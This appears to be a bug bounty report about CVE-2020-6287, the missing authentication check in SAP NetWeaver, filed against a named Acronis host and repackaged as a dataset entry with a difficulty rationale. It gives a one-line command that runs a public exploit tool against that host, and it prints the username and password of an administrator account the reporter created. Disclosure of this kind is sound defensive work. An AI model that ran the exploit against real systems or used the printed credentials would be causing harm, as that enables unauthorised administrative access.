title: CVE-2020-6287  https://redapi2.acronis.com
content:
Hi team.
Summary
CVE-2020-6287 https://redapi2.acronis.com
https://nvd.nist.gov/vuln/detail/CVE-2020-6287
SAP NetWeaver AS JAVA (LM Configuration Wizard), versions - 7.30, 7.31, 7.40, 7.50, does not perform an authentication check which allows an attacker without prior authentication to execute configuration tasks to perform critical actions against the SAP Java system, including the ability to create an administrative user, and therefore compromising Confidentiality, Integrity and Availability of the system, leading to Missing Authentication Check.
You can check. I created user with role 'Administrator'
Code 26 Bytes
1sapRpoc9846:Secure!PwD7849
Steps To Reproduce
clone https://github.com/chipik/SAP_RECON
python3 RECON.py -a -H redapi2.acronis.com -P 443 -s
Thanks.
Impact
administrative user on sap system
steps: Run the script with the target host and port: python3 RECON.py -a -H redapi2.acronis.com -P 443 -s
vuln_description: SAP NetWeaver AS JAVA (LM Configuration Wizard) versions 7.30, 7.31, 7.40, 7.50 lack an authentication check, allowing unauthenticated attackers to execute configuration tasks. This includes creating administrative users, compromising the system's Confidentiality, Integrity, and Availability.
reason: The vulnerability involves a straightforward exploitation of a missing authentication check in a known component (SAP NetWeaver AS JAVA). The attack requires minimal steps and does not involve complex interactions or states.
